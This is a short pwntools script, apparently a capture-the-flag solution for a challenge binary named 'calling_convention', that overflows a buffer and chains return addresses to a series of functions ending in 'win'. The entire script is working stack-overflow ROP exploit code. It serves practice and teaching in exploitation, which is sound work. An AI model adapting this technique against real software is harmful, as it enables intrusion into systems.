from pwn import *
elf = context.binary = ELF("./calling_convention")
offset = 16
# p = remote("chal.bearcatctf.io",39440)
p = process()
rop = ROP(context.binary)
ret = p64(rop.find_gadget(['ret'])[0])
payload = b"A" * offset + ret + p64(elf.sym['ahhhhhhhh']) + p64(elf.sym['number3']) + p64(elf.sym['set_key1']) + p64(elf.sym['food']) + p64(elf.sym['win'])
p.sendline(payload)
write("payload",payload)
print(p.recvall())
